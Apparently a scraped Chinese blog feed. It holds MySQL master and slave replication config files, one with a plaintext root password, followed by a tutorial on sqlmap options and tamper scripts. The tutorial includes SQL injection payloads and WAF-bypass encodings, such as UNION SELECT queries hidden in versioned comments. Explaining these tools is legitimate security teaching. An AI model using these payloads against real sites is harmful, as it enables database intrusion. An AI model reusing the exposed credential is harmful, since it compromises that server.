class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Example MySQL config file for medium systems.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is for a system with little memory (32M - 64M) where MySQL plays</span></span><br><span class="line"><span class="comment"># an important part, or systems up to 128M where MySQL is used together with</span></span><br><span class="line"><span class="comment"># other programs (such as a web server)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You can copy this file to</span></span><br><span class="line"><span class="comment"># /etc/my.cnf to set global options,</span></span><br><span class="line"><span class="comment"># mysql-data-dir/my.cnf to set server-specific options (in this</span></span><br><span class="line"><span class="comment"># installation this directory is C:\mysql\data) or</span></span><br><span class="line"><span class="comment"># ~/.my.cnf to set user-specific options.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In this file, you can use all long options that a program supports.</span></span><br><span class="line"><span class="comment"># If you want to know which options a program supports, run the program</span></span><br><span class="line"><span class="comment"># with the "--help" option.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The following options will be passed to all MySQL clients</span></span><br><span class="line">[client]</span><br><span class="line">port        = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">socket = <span class="string">"D:\mysql_main\mysql-5.7.13-winx64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line"></span><br><span class="line">no-auto-rehash</span><br><span class="line"><span class="comment"># Remove the next comment character if you are not familiar with SQL</span></span><br><span class="line"><span class="comment">#safe-updates</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">server-id=<span class="number">5</span></span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line"><span class="built_in">log</span>-bin=mysql-bin</span><br><span class="line">binlog-do-db=t_qcpj</span><br><span class="line">binlog_format=<span class="string">"MIXED"</span></span><br><span class="line">socket = <span class="string">"D:/mysql_main/mysql-5.7.13-winx64/mysql.sock"</span></span><br><span class="line">explicit_defaults_<span class="keyword">for</span>_timestamp = TRUE</span><br><span class="line">character-set-server=utf8</span><br><span class="line">basedir=D:\mysql_main\mysql-<span class="number">5.7</span>.<span class="number">13</span>-winx64</span><br><span class="line">datadir=D:\mysql_main\mysql-<span class="number">5.7</span>.<span class="number">13</span>-winx64\data</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>-output=FILE</span><br><span class="line">general-log=<span class="number">0</span></span><br><span class="line">general_<span class="built_in">log</span>_file=<span class="string">"WIN-KGGGQSE2NIE.log"</span></span><br><span class="line">slow-query-log=<span class="number">1</span></span><br><span class="line">slow_query_<span class="built_in">log</span>_file=<span class="string">"WIN-KGGGQSE2NIE-slow.log"</span></span><br><span class="line">long_query_time=<span class="number">10</span></span><br><span class="line"><span class="built_in">log</span>-error=<span class="string">"mysqlerr.log"</span></span><br><span class="line">ft_min_word_len=<span class="number">1</span></span><br><span class="line">pid_file  = <span class="string">"mysql.pid"</span></span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line">max_binlog_size=<span class="number">500</span>M</span><br><span class="line">binlog_cache_size=<span class="number">128</span>K</span><br><span class="line">binlog_ignore_db=mysql</span><br><span class="line"><span class="built_in">log</span>-slave-updates</span><br><span class="line">max_connections=<span class="number">151</span></span><br><span class="line">query_cache_size=<span class="number">0</span></span><br><span class="line">tmp_table_size=<span class="number">310</span>M</span><br><span class="line">table_open_cache=<span class="number">2000</span></span><br><span class="line">thread_cache_size=<span class="number">10</span></span><br><span class="line">myisam_max_sort_file_size=<span class="number">100</span>G</span><br><span class="line">sql-mode=<span class="string">"STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"</span></span><br><span class="line">myisam_sort_buffer_size=<span class="number">608</span>M</span><br><span class="line">key_buffer_size=<span class="number">8</span>M</span><br><span class="line"><span class="built_in">read</span>_buffer_size=<span class="number">64</span>K</span><br><span class="line"><span class="built_in">read</span>_rnd_buffer_size=<span class="number">256</span>K</span><br><span class="line">sort_buffer_size=<span class="number">256</span>K</span><br><span class="line"></span><br><span class="line">innodb_flush_<span class="built_in">log</span>_at_trx_commit=<span class="number">1</span></span><br><span class="line">innodb_<span class="built_in">log</span>_buffer_size=<span class="number">1</span>M</span><br><span class="line">innodb_buffer_pool_size=<span class="number">8</span>M</span><br><span class="line">innodb_<span class="built_in">log</span>_file_size=<span class="number">48</span>M</span><br><span class="line">innodb_thread_concurrency=<span class="number">17</span></span><br><span class="line">innodb_autoextend_increment=<span class="number">64</span></span><br><span class="line">innodb_buffer_pool_instances=<span class="number">8</span></span><br><span class="line"></span><br><span class="line">innodb_concurrency_tickets=<span class="number">5000</span></span><br><span class="line">innodb_old_blocks_time=<span class="number">1000</span></span><br><span class="line">innodb_open_files=<span class="number">300</span></span><br><span class="line">innodb_stats_on_metadata=<span class="number">0</span></span><br><span class="line">innodb_file_per_table=<span class="number">1</span></span><br><span class="line">innodb_checksum_algorithm=<span class="number">0</span></span><br><span class="line">back_<span class="built_in">log</span>=<span class="number">80</span></span><br><span class="line">flush_time=<span class="number">0</span></span><br><span class="line">join_buffer_size=<span class="number">256</span>K</span><br><span class="line">max_allowed_packet=<span class="number">4</span>M</span><br><span class="line">max_connect_errors=<span class="number">100</span></span><br><span class="line">open_files_<span class="built_in">limit</span>=<span class="number">4161</span></span><br><span class="line">query_cache_<span class="built_in">type</span>=<span class="number">0</span></span><br><span class="line">table_definition_cache=<span class="number">1400</span></span><br><span class="line">binlog_row_event_max_size=<span class="number">8</span>K</span><br><span class="line">sync_master_info=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the value of this variable is greater than 0, the MySQL server synchronizes its relay log to disk.</span></span><br><span class="line"><span class="comment"># (using fdatasync()) after every sync_relay_log writes to the relay log.</span></span><br><span class="line">sync_relay_<span class="built_in">log</span>=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the value of this variable is greater than 0, a replication slave synchronizes its relay-log.info file to disk.</span></span><br><span class="line"><span class="comment"># (using fdatasync()) after every sync_relay_log_info transactions.</span></span><br><span class="line">sync_relay_<span class="built_in">log</span>_info=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load mysql plugins at start."plugin_x ; plugin_y".</span></span><br><span class="line"><span class="comment"># plugin_load</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL server's plugin configuration.</span></span><br><span class="line"><span class="comment"># loose_mysqlx_port=33060</span></span><br><span class="line"></span><br><span class="line">[mysqldump]</span><br><span class="line">quick</span><br><span class="line">max_allowed_packet = <span class="number">16</span>M</span><br><span class="line"></span><br><span class="line">[isamchk]</span><br><span class="line">key_buffer       = <span class="number">20</span>M</span><br><span class="line">sort_buffer_size = <span class="number">20</span>M</span><br><span class="line"><span class="built_in">read</span>_buffer      = <span class="number">2</span>M</span><br><span class="line">write_buffer     = <span class="number">2</span>M</span><br><span class="line"></span><br><span class="line">[myisamchk]</span><br><span class="line">key_buffer       = <span class="number">20</span>M</span><br><span class="line">sort_buffer_size = <span class="number">20</span>M</span><br><span class="line"><span class="built_in">read</span>_buffer      = <span class="number">2</span>M</span><br><span class="line">write_buffer     = <span class="number">2</span>M</span><br><span class="line"></span><br><span class="line">[mysqlhotcopy]</span><br><span class="line">interactive-timeout</span><br></pre></td></tr></table></figure></p>
<p>从库配置文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">[client]</span><br><span class="line">port        = <span class="number">3307</span></span><br><span class="line">socket = <span class="string">"D:\mysql_sub\mysql-5.7.13-winx64"</span></span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">user = root </span><br><span class="line">password =China1000</span><br><span class="line">[mysql]</span><br><span class="line">no-auto-rehash</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">server-id =<span class="number">3</span></span><br><span class="line"><span class="built_in">log</span>-bin=mysql-bin</span><br><span class="line">replicate-do-db=t_qcpj</span><br><span class="line">replicate-ignore-db=mysql</span><br><span class="line">slave-skip-errors=<span class="number">1007</span>,<span class="number">1008</span>,<span class="number">1053</span>,<span class="number">1062</span>,<span class="number">1213</span>,<span class="number">1158</span>,<span class="number">1159</span></span><br><span class="line">binlog_format=mixed</span><br><span class="line">port=<span class="number">3307</span></span><br><span class="line">socket = <span class="string">"D:/mysql_sub/mysql-5.7.13-winx64/mysql.sock"</span></span><br><span class="line">explicit_defaults_<span class="keyword">for</span>_timestamp = TRUE</span><br><span class="line">basedir=D:/mysql_sub/mysql-<span class="number">5.7</span>.<span class="number">13</span>-winx64</span><br><span class="line"><span class="built_in">log</span>-error=<span class="string">"mysqlerr.log"</span></span><br><span class="line">datadir=D:/mysql_sub/mysql-<span class="number">5.7</span>.<span class="number">13</span>-winx64/data</span><br><span class="line">pid_file  = <span class="string">"mysql.pid"</span></span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line">max_binlog_size=<span class="number">500</span>M</span><br><span class="line">binlog_cache_size=<span class="number">128</span>K</span><br><span class="line">binlog_ignore_db=mysql</span><br><span class="line"><span class="built_in">log</span>-slave-updates</span><br><span class="line">ft_min_word_len=<span class="number">1</span></span><br><span class="line">max_connections=<span class="number">151</span></span><br><span class="line">query_cache_size=<span class="number">0</span></span><br><span class="line">tmp_table_size=<span class="number">310</span>M</span><br><span class="line">table_open_cache=<span class="number">2000</span></span><br><span class="line">thread_cache_size=<span class="number">10</span></span><br><span class="line">myisam_max_sort_file_size=<span class="number">100</span>G</span><br><span class="line">sql-mode=<span class="string">"STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"</span></span><br><span class="line">myisam_sort_buffer_size=<span class="number">608</span>M</span><br><span class="line">key_buffer_size=<span class="number">8</span>M</span><br><span class="line"><span class="built_in">read</span>_buffer_size=<span class="number">64</span>K</span><br><span class="line"><span class="built_in">read</span>_rnd_buffer_size=<span class="number">256</span>K</span><br><span class="line">sort_buffer_size=<span class="number">256</span>K</span><br><span class="line"></span><br><span class="line">innodb_flush_<span class="built_in">log</span>_at_trx_commit=<span class="number">1</span></span><br><span class="line">innodb_<span class="built_in">log</span>_buffer_size=<span class="number">1</span>M</span><br><span class="line">innodb_buffer_pool_size=<span class="number">8</span>M</span><br><span class="line">innodb_<span class="built_in">log</span>_file_size=<span class="number">48</span>M</span><br><span class="line">innodb_thread_concurrency=<span class="number">17</span></span><br><span class="line">innodb_autoextend_increment=<span class="number">64</span></span><br><span class="line">innodb_buffer_pool_instances=<span class="number">8</span></span><br><span class="line"></span><br><span class="line">innodb_concurrency_tickets=<span class="number">5000</span></span><br><span class="line">innodb_old_blocks_time=<span class="number">1000</span></span><br><span class="line">innodb_open_files=<span class="number">300</span></span><br><span class="line">innodb_stats_on_metadata=<span class="number">0</span></span><br><span class="line">innodb_file_per_table=<span class="number">1</span></span><br><span class="line">innodb_checksum_algorithm=<span class="number">0</span></span><br><span class="line">back_<span class="built_in">log</span>=<span class="number">80</span></span><br><span class="line">flush_time=<span class="number">0</span></span><br><span class="line">join_buffer_size=<span class="number">256</span>K</span><br><span class="line">max_allowed_packet=<span class="number">4</span>M</span><br><span class="line">max_connect_errors=<span class="number">100</span></span><br><span class="line">open_files_<span class="built_in">limit</span>=<span class="number">4161</span></span><br><span class="line">query_cache_<span class="built_in">type</span>=<span class="number">0</span></span><br><span class="line">table_definition_cache=<span class="number">1400</span></span><br><span class="line">binlog_row_event_max_size=<span class="number">8</span>K</span><br><span class="line">sync_master_info=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the value of this variable is greater than 0, the MySQL server synchronizes its relay log to disk.</span></span><br><span class="line"><span class="comment"># (using fdatasync()) after every sync_relay_log writes to the relay log.</span></span><br><span class="line">sync_relay_<span class="built_in">log</span>=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If the value of this variable is greater than 0, a replication slave synchronizes its relay-log.info file to disk.</span></span><br><span class="line"><span class="comment"># (using fdatasync()) after every sync_relay_log_info transactions.</span></span><br><span class="line">sync_relay_<span class="built_in">log</span>_info=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Load mysql plugins at start."plugin_x ; plugin_y".</span></span><br><span class="line"><span class="comment"># plugin_load</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL server's plugin configuration.</span></span><br><span class="line"><span class="comment"># loose_mysqlx_port=33060</span></span><br><span class="line">[mysqldump]</span><br><span class="line">quick</span><br><span class="line">max_allowed_packet = <span class="number">16</span>M</span><br><span class="line"></span><br><span class="line">[isamchk]</span><br><span class="line">key_buffer       = <span class="number">20</span>M</span><br><span class="line">sort_buffer_size = <span class="number">20</span>M</span><br><span class="line"><span class="built_in">read</span>_buffer      = <span class="number">2</span>M</span><br><span class="line">write_buffer     = <span class="number">2</span>M</span><br><span class="line"></span><br><span class="line">[myisamchk]</span><br><span class="line">key_buffer       = <span class="number">20</span>M</span><br><span class="line">sort_buffer_size = <span class="number">20</span>M</span><br><span class="line"><span class="built_in">read</span>_buffer      = <span class="number">2</span>M</span><br><span class="line">write_buffer     = <span class="number">2</span>M</span><br><span class="line"></span><br><span class="line">[mysqlhotcopy]</span><br><span class="line">interactive-timeout</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqlmap常用技巧整理]]></title>
      <url>https://nanshihui.github.io/2016/02/25/sqlmaptips/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>通过在乌云网上出现的很多SQL注入漏洞，因此来总结一下，大致使用SQLMAP所遇到的参数。<br><a id="more"></a><p></p>
<h2 id="u57FA_u672C_u7ED3_u6784"><a href="#u57FA_u672C_u7ED3_u6784" class="headerlink" title="基本结构"></a>基本结构</h2><p>　　基本SQLMAP的使用方式就如下所示，使用参数式的方式，按需求添加。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">"http:// *"</span>  --data=<span class="string">"a=b"</span> -p a   --level <span class="number">3</span> --random-agent --referer=<span class="string">"a"</span> </span><br><span class="line">--technique T --dbms=mysql --cookie=<span class="string">"cookie"</span> --tables</span><br></pre></td></tr></table></figure></p>
<h2 id="u53C2_u6570_u89E3_u91CA"><a href="#u53C2_u6570_u89E3_u91CA" class="headerlink" title="参数解释"></a>参数解释</h2><h3 id="u661F_u53F7"><a href="#u661F_u53F7" class="headerlink" title="星号"></a>星号</h3><p>　　在注入的过程中，有时候是伪静态的页面，可以使用星号表示可能存在注入的部分</p>
<h3 id="u2013data"><a href="#u2013data" class="headerlink" title="–data"></a>–data</h3><p>　　使用post方式提交的时候，就需要用到data参数了</p>
<h3 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h3><p>　　当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间</p>
<h3 id="u2013level"><a href="#u2013level" class="headerlink" title="–level"></a>–level</h3><p>　　不同的level等级，SQLMAP所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。</p>
<h3 id="u2013random-agent"><a href="#u2013random-agent" class="headerlink" title="–random-agent"></a>–random-agent</h3><p>　　使用该参数，SQLMAP会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent</p>
<h3 id="u2013technique"><a href="#u2013technique" class="headerlink" title="–technique"></a>–technique</h3><p>　　这个参数可以指定SQLMAP使用的探测技术，默认情况下会测试所有的方式。</p>
<p>　　支持的探测方式如下：</p>
<p>　　B: Boolean-based blind SQL injection（布尔型注入）<br>　　E: Error-based SQL injection（报错型注入）<br>　　U: UNION query SQL injection（可联合查询注入）<br>　　S: Stacked queries SQL injection（可多语句查询注入）<br>　　T: Time-based blind SQL injection（基于时间延迟注入）</p>
<h3 id="u2013tamper"><a href="#u2013tamper" class="headerlink" title="–tamper"></a>–tamper</h3><p>　　有些时候网站会过滤掉各种字符，可以用tamper来解决（对付某些waf时也有成效）<br>　　–tamper=”space2comment.py”<br>　　理论是用/**/代替空格，当然temper的选项还有很多</p>
<ul>
<li>apostrophemask.py</li>
</ul>
<p>　　作用：用utf8代替引号</p>
<ul>
<li>equaltolike.py</li>
</ul>
<p>　　作用：like 代替等号</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT * FROM users WHERE id=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">Output: SELECT * FROM users WHERE id LIKE <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>space2dash.py</li>
</ul>
<p>　　作用：绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227'</span>) <span class="string">'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>greatest.py</li>
</ul>
<p>　　作用：绕过过滤’&gt;’ ,用GREATEST替换大于号。<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND A &gt; B'</span>) <span class="string">'1 AND GREATEST(A,B+1)=A'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>space2hash.py</li>
</ul>
<p>　　作用：空格替换为#号 随机字符串 以及换行符</p>
<p>　　Example:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span></span><br><span class="line"> Output: <span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cW<span class="built_in">fc</span>VRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure>
<ul>
<li>apostrophenullencode.py</li>
</ul>
<p>　　作用：绕过过滤双引号，替换字符和双引号。<br>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper(<span class="string">"1 AND '1'='1"</span>) <span class="string">'1 AND %00%271%00%27=%00%271'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>halfversionedmorekeywords.py</li>
</ul>
<p>　　作用：当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">"value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() </span><br><span class="line">AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa"</span>) </span><br><span class="line">　<span class="string">"value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>space2morehash.py</li>
</ul>
<p>　　作用：空格替换为 #号 以及更多随机字符串 换行符</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: <span class="number">1</span> AND <span class="number">9227</span>=<span class="number">9227</span> </span><br><span class="line"></span><br><span class="line">Output: <span class="number">1</span>%<span class="number">23</span>PTTmJopxdWJ%<span class="number">0</span>AAND%<span class="number">23</span>cW<span class="built_in">fc</span>VRPV%<span class="number">0</span>A9227=<span class="number">9227</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>appendnullbyte.py</li>
</ul>
<p>　作用：在有效负荷结束位置加载零字节字符编码<br>　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 1=1'</span>) <span class="string">'1 AND 1=1%00'</span></span><br></pre></td></tr></table></figure></p>
<p>　　常用于access</p>
<ul>
<li>ifnull2ifisnull.py</li>
</ul>
<p>　作用：绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’<br>Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'IFNULL(1, 2)'</span>) <span class="string">'IF(ISNULL(1),2,1)'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>space2mssqlblank.py(mssql)</li>
</ul>
<p>　　作用：空格替换为其它空符号</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: SELECT id FROM users * </span><br><span class="line">Output: SELECT%<span class="number">08</span>id%<span class="number">02</span>FROM%<span class="number">0</span>Fusers</span><br></pre></td></tr></table></figure></p>
<ul>
<li>base64encode.py</li>
</ul>
<p>　　作用：用base64编码替换 Example: (“1’ AND SLEEP(5)#”) ‘MScgQU5EIFNMRUVQKDUpIw==’ Requirement: all</p>
<ul>
<li>space2mssqlhash.py</li>
</ul>
<p>　　作用：替换空格</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227'</span>) <span class="string">'1%23%0AAND%23%0A9227=9227'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>modsecurityversioned.py</li>
</ul>
<p>　　作用：过滤空格，包含完整的查询版本注释</p>
<p>　　Example:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 2&gt;1--'</span>) <span class="string">'1 /*!30874AND 2&gt;1*/--'</span></span><br></pre></td></tr></table></figure>
<ul>
<li>space2mysqlblank.py</li>
</ul>
<p>　　作用：空格替换其它空白符号(mysql)</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　Input: SELECT id FROM users </span><br><span class="line"></span><br><span class="line">　Output: SELECT%<span class="number">0</span>Bid%<span class="number">0</span>BFROM%A0users</span><br></pre></td></tr></table></figure></p>
<ul>
<li>between.py</li>
</ul>
<p>　　作用：用between替换大于号（&gt;）</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND A &gt; B--'</span>) <span class="string">'1 AND A NOT BETWEEN 0 AND B--'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>space2mysqldash.py</li>
</ul>
<p>　　作用：替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p>
<p>注：之前有个mssql的 这个是mysql的</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 AND 9227=9227'</span>) <span class="string">'1--%0AAND--%0A9227=9227'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>multiplespaces.py</li>
</ul>
<p>　　作用：围绕SQL关键字添加多个空格</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'1 UNION SELECT foobar'</span>) <span class="string">'1 UNION SELECT foobar'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>：space2plus.py</li>
</ul>
<p>　　作用：用+替换空格</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'SELECT id FROM users'</span>) <span class="string">'SELECT+id+FROM+users'</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>bluecoat.py</li>
</ul>
<p>　　作用：代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</p>
<p>　　Example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'SELECT id FROM users where id = 1'</span>) <span class="string">'SELECT%09id FROM users where id LIKE 1'</span></span><br></pre></td></tr></table></figure></p>
<ul>
